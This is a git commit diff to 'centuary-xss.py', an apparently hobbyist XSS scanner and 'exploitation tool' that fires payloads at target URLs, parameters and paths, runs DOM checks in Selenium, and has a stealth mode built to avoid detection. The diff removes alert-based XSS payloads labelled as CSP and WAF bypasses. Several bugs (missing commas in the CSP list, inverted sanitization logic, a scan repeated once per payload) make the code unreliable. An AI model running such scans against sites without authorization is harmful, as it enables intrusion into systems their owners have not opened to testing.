8c6c1175bf9ae80f8ca5cbe3f2e7a124b09583a8
centuary <destanyprosaccod@duck.com>
2024-08-27 14:16:10 +0000

    centuary-xss.py

--- centuary-xss.py
+++ centuary-xss.py
@@ -4,7 +4,9 @@ import urllib.parse
 import random
 import json
 import os
+import re
 import platform
+from bs4 import BeautifulSoup
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service as ChromeService
@@ -13,35 +15,59 @@ from selenium.webdriver.edge.service import Service as EdgeService
 from selenium.webdriver.firefox.options import Options as FirefoxOptions
 from selenium.webdriver.edge.options import Options as EdgeOptions
 from argparse import ArgumentParser
-from termcolor import colored
 import pyfiglet
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
 from selenium.common.exceptions import TimeoutException, NoAlertPresentException
+from tqdm import tqdm  # Import tqdm for progress bar
 
 # Constants
 MAX_RETRIES = 3
 DEFAULT_TIMEOUT = 10
 
-# Generate Payloads
-def generate_payloads(payloads=None):
-    default_payloads = [
-        "alert('XSS')",
-        "<img src='x' onerror='alert(1)'>",
-        "<img src='x' onerror='this.onerror=null;alert(1)'>",  # CSP bypass
-        "<sCript>alert`1`</scrIpt>"  # WAF bypass
-    ]
-    encoded_default_payloads = [urllib.parse.quote_plus(payload) for payload in default_payloads]
+# colors lmao
+cyan = '\033[96m'
+purple = '\033[95m'
+orange = '\033[33m'
+red = '\033[91m'
+green = '\033[92m'
+boldgreen = '\033[1;32m'
+yellow = '\033[93m'
+blue = '\033[94m'
+boldwhite = '\033[1;97m'
+reset = '\033[0m'
 
-    if payloads:
-        # Do not encode user-provided payloads
-        return payloads + encoded_default_payloads
+results = []
 
-    return default_payloads + encoded_default_payloads
+# tool_example Payloads
+def eg_payloads(payload_input):
+    payloads = []
+    if os.path.isfile(payload_input):
+        try:
+            with open(payload_input, 'r') as file:
+                payloads = [line.strip() for line in file if line.strip()]
+                if not payloads:
+                    raise ValueError(f"{boldwhite}The payloads file is empty.{reset}")
+        except FileNotFoundError:
+            print(f"{boldwhite}Error: The payload file '{payload_input}' was not found.{reset}")
+            return[]
+        except PermissionError:
+            print(f"{boldwhite}Error: Insufficent permission to read the payload file '{payload_input}'.{reset}")
+            return[]
+        except ValueError as ve:
+            print(f"{boldwhite}Error {ve}{reset}")
+            return[]
+        except Exception as e:
+            print(f"{boldwhite}Error: An unexpected error while reading payload file '{payload_input}'. Error: {e}{reset}")
+            return[]
+    else:
+        payloads = [payload_input]
+
+    return payloads
 
 # Asynchronous Scanner Engine with retry and extended timeout
-async def scan(url, payloads, semaphore, stealth_mode=False, method='GET', data=None, timeout=DEFAULT_TIMEOUT):
+async def scan(url, payloads, semaphore, stealth_mode=False, method='GET', data=None, timeout=DEFAULT_TIMEOUT, delay=0.5):
     async with semaphore:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
             tasks = []
@@ -54,16 +80,16 @@ async def scan(url, payloads, semaphore, stealth_mode=False, method='GET', data=
 
             for response in responses:
                 if response:
-                    url, payload, text = response
-                    if is_false_positive(text, payload, response.headers):
-                        print(colored(f"[+] False positive avoided for payload: {payload} on {url}", 'yellow'))
+                    url, payload, text, headers = response
+
+                    if is_false_positive(text, payload, headers):
+                        print(f"{purple}[+] False positive avoided for payload: {payload} on {url}{reset}")
                     else:
-                        print(colored(f"[!] Possible XSS detected with payload: {payload} on {url}", 'red'))
+                        print(f"{green}[✔️] Possible XSS detected with payload: {payload} on {url}{reset}")
                 else:
-                    print(colored(f"[!] No response or failed for payload: {payload} on {url}", 'yellow'))
+                    print(f"{yellow}[!] No response or failed for payload: {payload} on {url}{reset}")
 
                 if stealth_mode:
-                    delay = random.uniform(0.5, 2.0)
                     await asyncio.sleep(delay)
 
 async def scan_post(session, url, payload, data, timeout):
@@ -71,12 +97,13 @@ async def scan_post(session, url, payload, data, timeout):
         try:
             async with session.post(url, data={**data, 'input': payload}) as response:
                 text = await response.text()
-            return url, payload, text, response.headers
+                headers = response.headers
+                return url, payload, text, response.headers
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
             if attempt < MAX_RETRIES - 1:
                 await asyncio.sleep(2 ** attempt)  # Exponential backoff
                 continue
-            print(colored(f"[!] POST request failed for payload: {payload} on {url}. Error: {e}", 'red'))
+            print(f"{red}[!] POST request failed for payload: {payload} on {url}. Error: {e}{reset}")
             return None
 
 async def scan_get(session, url, payload, timeout):
@@ -85,16 +112,19 @@ async def scan_get(session, url, payload, timeout):
         try:
             async with session.get(target_url) as response:
                 text = await response.text()
-            return target_url, payload, text, response.headers
+                headers = response.headers
+                return target_url, payload, text, response.headers
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
             if attempt < MAX_RETRIES - 1:
                 await asyncio.sleep(2 ** attempt)  # Exponential backoff
                 continue
-            print(colored(f"[!] GET request failed for payload: {payload} on {url}. Error: {e}", 'red'))
+            print(f"{red}[!] GET request failed for payload: {payload} on {url}. Error: {e}{reset}")
             return None
 
 # Contextual False Positive Detection
 def is_false_positive(text, payload, headers):
+    if headers is None:
+        headers = {}
     if in_safe_context(text, payload):
         return True
     if is_non_executable_context(text):
@@ -106,29 +136,51 @@ def is_false_positive(text, payload, headers):
     return False
 
 def in_safe_context(text, payload):
-    safe_contexts = ['<textarea>', '<pre>', '<code>', '&lt;', '&gt;']
-    for context in safe_contexts:
-        if context in text:
+    soup = BeautifulSoup(text, 'html.parser')
+    safe_tags = ['<textarea>', '<pre>', '<code>', '&lt;', '&gt;']
+    for tag in safe_tags:
+        if soup.find_all(tag):
             return True
+    if any(payload in str(tag) for tag in soup.find_all()):
+        return True
     return False
 
 def is_non_executable_context(text):
     return "<!--" in text or "-->" in text
 
 def is_sanitized(text, payload):
-    return urllib.parse.quote_plus(payload) in text or payload.replace('<', '&lt;').replace('>', '&gt;') in text
+    encoded_payload = urllib.parse.quote_plus(payload) 
+    sanitized_payload = payload.replace('<', '&lt;').replace('>', '&gt;') 
+
+    if encoded_payload in text or sanitized_payload in text:
+        return True
+
+    html_entity_payloads = payload.replace('<', '&#60').replace('>', '&#62')
+    if html_entity_payloads in text:
+        return True
+
+    if re.search(re.escape(payload), text, re.IGNORECASE):
+        return True
+
+    return False
 
 def has_strong_csp(headers):
     csp = headers.get('Content-Security-Policy', '')
-    return "script-src 'self'" in csp or "script-src 'nonce-" in csp
+    strong_policies = [
+        "script-src 'self'"
+        "script-src 'nonce-"
+        "script-src 'strict-dynamic'"
+    ]
+    return any(policy in csp for policy in strong_policies)
 
 # DOM-Based XSS Detection with Improved Dynamic Content Handling
 def check_dom_xss(url, payloads, browser='chrome', chromedriver_path=None, geckodriver_path=None, edgedriver_path=None):
     options, service = get_browser_options(browser, chromedriver_path, geckodriver_path, edgedriver_path)
 
     driver = webdriver.Chrome(service=service, options=options) if browser == 'chrome' else (
-             webdriver.Firefox(service=service, options=options) if browser == 'firefox' else 
-             webdriver.Edge(service=service, options=options))
+        webdriver.Firefox(service=service, options=options) if browser == 'firefox' else 
+        webdriver.Edge(service=service, options=options)
+    )
 
     for payload in payloads:
         driver.get(f"{url}?input={payload}")
@@ -141,19 +193,21 @@ def check_dom_xss(url, payloads, browser='chrome', chromedriver_path=None, gecko
             logs = driver.get_log('browser')
             for log in logs:
                 if 'error' in log['message'].lower():
-                    print(colored(f"[!] JavaScript error detected for payload: {payload} on {url}. Error: {log['message']}", 'red'))
+                    print(f"{red}[!] JavaScript error detected for payload: {payload} on {url}. Error: {log['message']}{reset}")
 
+                if "unexpected behavior" in driver.page_source.lower():
+                    print(f"{green}[✔️] DOM XSS detected with payload: {payload} on {url}{reset}")
             try:
                 alert = driver.switch_to.alert
-                print(colored(f"[!] DOM XSS detected with payload: {payload} on {url}", 'red'))
+                print(f"{green}[✔️] DOM XSS detected with payload: {payload} on {url}{reset}")
                 alert.accept()
             except NoAlertPresentException:
-                print(colored(f"[+] Safe for DOM payload: {payload} on {url}", 'green'))
+                print(f"{cyan}[+] Safe for DOM payload: {payload} on {url}{reset}")
 
         except TimeoutException:
-            print(colored(f"[+] Safe for DOM payload: {payload} on {url}", 'green'))
+            print(f"{cyan}[+] Safe for DOM payload: {payload} on {url}{reset}")
         except Exception as e:
-            print(colored(f"[!] Error detecting DOM XSS with payload: {payload} on {url}. Error: {e}", 'red'))
+            print(f"{red}[!] Error detecting DOM XSS with payload: {payload} on {url}. Error: {e}{reset}")
 
     driver.quit()
 
@@ -187,11 +241,13 @@ def detect_server_environment(url):
 
 # Path-Based Analysis
 async def path_based_analysis(url, payloads, paths, semaphore, stealth_mode=False):
-    tasks = [scan(f"{url}/{path}", payloads, semaphore, stealth_mode) for path in paths]
-    await asyncio.gather(*tasks)
+    for path in paths:
+        full_url = f"{url}/{path}"
+        print(f"{blue}[*] Scanning path: {full_url}{reset}")
+        await scan(full_url, payloads, semaphore, stealth_mode)
 
 # Advanced Parameter Analysis
-async def analyze_parameters(url, payloads, parameters, semaphore, stealth_mode=False, timeout=DEFAULT_TIMEOUT):
+async def analyze_parameters(url, payloads, parameters, semaphore, stealth_mode=False, timeout=DEFAULT_TIMEOUT, delay=0.5):
     async with semaphore:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
             tasks = []
@@ -199,33 +255,46 @@ async def analyze_parameters(url, payloads, parameters, semaphore, stealth_mode=
                 for payload in payloads:
                     tampered_data = {param: payload}
                     tasks.append(scan_param(session, url, tampered_data, payload, timeout))
-            responses = await asyncio.gather(*tasks)
-
-            for response in responses:
+            total_tasks = len(tasks)
+            for i, response in enumerate(await asyncio.gather(*tasks)):
+                print(f"Debug - Response received: {response}")
                 if response:
-                    url, param, payload, text = response
-                    if is_false_positive(text, payload, response.headers):
-                        print(colored(f"[+] False positive avoided for parameter tampering: {param}={payload} on {url}", 'yellow'))
+                    if len(response) == 4:
+                        url, param, payload, text = response
+                        headers  = {}
+                    elif len(response) == 5:
+                        url, param, payload, text, headers = response
                     else:
-                        print(colored(f"[!] Possible XSS detected with parameter tampering: {param}={payload} on {url}", 'red'))
+                        continue
+
+                    if headers is None:
+                        headers = {}
+
+                    if is_false_positive(text, payload, response.headers):
+                        print(f"{purple}[+] False positive avoided for parameter tampering: {param}={payload} on {url}{reset}")
+                    else:
+                        print(f"{green}[✔️] Possible XSS detected with parameter tampering: {param}={payload} on {url}{reset}")
                 else:
-                    print(colored(f"[!] No response or failed for parameter tampering: {param}={payload} on {url}", 'yellow'))
+                    print(f"{yellow}[!] No response or failed for parameter tampering: {param}={payload} on {url}{reset}")
 
                 if stealth_mode:
-                    delay = random.uniform(0.5, 2.0)
                     await asyncio.sleep(delay)
+
+                # Update progress bar
+                tqdm.write(f"{boldwhite}Progress: {i + 1}/{total_tasks}{reset}")
 
 async def scan_param(session, url, data, payload, timeout):
     for attempt in range(MAX_RETRIES):
         try:
             async with session.get(url, params=data) as response:
                 text = await response.text()
-            return url, list(data.keys())[0], payload, text, response.headers
+                headers = response.headers
+            return url, list(data.keys())[0], payload, text, headers
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
             if attempt < MAX_RETRIES - 1:
                 await asyncio.sleep(2 ** attempt)  # Exponential backoff
                 continue
-            print(colored(f"[!] GET request with parameter failed for {list(data.keys())[0]}={payload} on {url}. Error: {e}", 'red'))
+            print(f"{red}[!] GET request with parameter failed for {list(data.keys())[0]}={payload} on {url}. Error: {e}{reset}")
             return None
 
 # Reporting Module
@@ -246,7 +315,7 @@ def extension_based_detection(url, payloads, browser='chrome'):
 async def main():
     # Print ASCII art for "centuary-xss"
     ascii_banner = pyfiglet.figlet_format("centuary-xss")
-    print(colored(ascii_banner, 'cyan'))
+    print(f"{red}{ascii_banner}{reset}")
 
     parser = ArgumentParser(description="Advanced XSS Detection and Exploitation Tool")
     parser.add_argument('-u', '--url', type=str, help="Target URL")
@@ -275,15 +344,6 @@ async def main():
         with open(args.file, 'r') as file:
             urls.extend([line.strip() for line in file])
 
-    payloads = []
-    if args.payloads:
-        if os.path.isfile(args.payloads):
-            # Read payloads from file
-            with open(args.payloads, 'r') as file:
-                payloads = [line.strip() for line in file]
-        else:
-            # Treat as a single payload
-            payloads.append(args.payloads)
 
     mode = args.mode
     output_file = args.output
@@ -299,37 +359,48 @@ async def main():
     geckodriver_path = args.geckodriver
     edgedriver_path = args.edgedriver
 
-    payloads = generate_payloads(payloads)
-    results = []
+    payloads = eg_payloads(args.payloads)
+    
+    if not payloads:
+        print(f"{orange}Error: No payloads were loaded. Exiting...{reset}")
 
     semaphore = asyncio.Semaphore(concurrency)
 
     for url in urls:
         server_env = detect_server_environment(url)
-        print(colored(f"[*] Detected server environment: {server_env}", 'yellow'))
+        print(f"{yellow}[*] Detected server environment: {server_env}{reset}")
 
         if mode in ['standard', 'stealth', 'all']:
-            print(colored(f"[*] Starting {'stealth ' if mode == 'stealth' else ''}scan on {url}...", 'blue'))
-            await scan(url, payloads, semaphore, stealth_mode=(mode == 'stealth'), method=method, data=data, timeout=timeout)
+            print(f"{blue}[*] Starting {'stealth ' if mode == 'stealth' else ''}scan on {url}...{reset}")
+            # Create a progress bar for scanning
+            for _ in tqdm(range(len(payloads)), desc=f"{boldwhite}Scanning payloads{reset}"):
+                await scan(url, payloads, semaphore, stealth_mode=(mode == 'stealth'), method=method, data=data, timeout=timeout, delay=delay)
 
         if mode in ['dom', 'all']:
-            print(colored(f"[*] Performing DOM-based XSS detection on {url} using {browser}...", 'blue'))
+            print(f"{blue}[*] Performing DOM-based XSS detection on {url} using {browser}...{reset}")
             check_dom_xss(url, payloads, browser, chromedriver_path, geckodriver_path, edgedriver_path)
 
         if mode in ['path', 'all'] and paths:
-            print(colored(f"[*] Performing path-based analysis on {url}...", 'blue'))
+            print(f"{blue}[*] Performing path-based analysis on {url}...{reset}")
             await path_based_analysis(url, payloads, paths, semaphore, stealth_mode=(mode == 'stealth'))
 
         if mode in ['params', 'all'] and params:
-            print(colored(f"[*] Performing advanced parameter analysis on {url}...", 'blue'))
-            await analyze_parameters(url, payloads, params, semaphore, stealth_mode=(mode == 'stealth'), timeout=timeout)
+            print(f"{blue}[*] Performing advanced parameter analysis on {url}...{red}")
+            await analyze_parameters(url, payloads, params, semaphore, stealth_mode=(mode == 'stealth'), timeout=timeout, delay=delay)
 
         if mode in ['extension', 'all']:
-            print(colored(f"[*] Performing extension-based XSS detection on {url}...", 'blue'))
+            print(f"{blue}[*] Performing extension-based XSS detection on {url}...{reset}")
             extension_based_detection(url, payloads, browser)
 
+        results.append(f"{green} Scan complete for {url}{reset}")
+
     generate_report(results, output_file)
-    print(colored(f"[*] Scan complete. Report saved to {output_file}.", 'green'))
+    print(f"{boldgreen}[*] Scan complete. Report saved to {output_file}.{reset}")
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n{boldwhite}[!] Process interupted by user. Exiting.....{reset}")
+        exit(0)
+
